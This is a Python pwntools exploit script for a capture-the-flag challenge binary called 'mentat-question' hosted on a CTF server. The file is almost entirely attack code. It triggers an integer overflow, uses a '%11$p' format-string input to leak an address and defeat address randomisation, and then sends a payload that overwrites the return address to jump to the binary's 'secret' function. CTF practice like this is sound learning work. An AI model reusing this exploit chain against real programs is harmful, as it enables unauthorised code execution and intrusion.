#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './mentat-question'
elf = context.binary = ELF(exe, checksec=True)
# libc = './lib/libc.so.6'
# libc = ELF(libc, checksec=False)

context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

host, port = 'challs.umdctf.io', 32300

def initialize(argv=[]):
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

r = initialize()
# =========================================================
#                         EXPLOITS
# =========================================================

first = False

def integer_overflow(first):
    if not first:
        r.sendlineafter(b"today?", b"Division")

    r.sendlineafter(b"divided?", b"1\n4294967296")
    return 

integer_overflow(first)
first = True

r.sendlineafter(b"again?", b"Yes %11$p")

r.recvuntil(b"Was that a Yes ")
main_leak = eval(r.recv(14))

gdb.attach(r, 'init-pwndbg')

elf.address = main_leak - (0x55555555545c - 0x555555554000)
integer_overflow(first)

payload = flat({
    0x00: b"Yes",
    0x18: p64(elf.address + 0x101a), 
    0x20: elf.sym['secret']
})

r.sendlineafter(b"again?", payload)
r.interactive()
